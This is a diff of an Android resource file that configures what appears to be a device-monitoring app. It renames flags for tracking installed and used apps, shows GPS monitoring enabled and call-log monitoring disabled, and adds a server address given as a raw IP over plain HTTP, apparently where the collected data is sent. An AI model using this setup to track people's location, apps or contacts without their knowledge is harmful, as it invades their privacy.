@@ -7,10 +7,10 @@
     <item name="monitor_gps_info" type="attr" format="boolean">
         true
     </item>
-    <item name="monitor_installed_apps" type="attr" format="boolean">
+    <item name="monitor_apps_installed" type="attr" format="boolean">
         true
     </item>
-    <item name="monitor_apps_used_info" type="attr" format="boolean">
+    <item name="monitor_apps_used" type="attr" format="boolean">
         true
     </item>
     <item name="monitor_contacts" type="attr" format="boolean">
@@ -19,4 +19,6 @@
     <item name="monitor_call_log" type="attr" format="boolean">
         false
     </item>
+    
+    <string name="server_address">http://61.148.201.134:880</string>
 </resources>
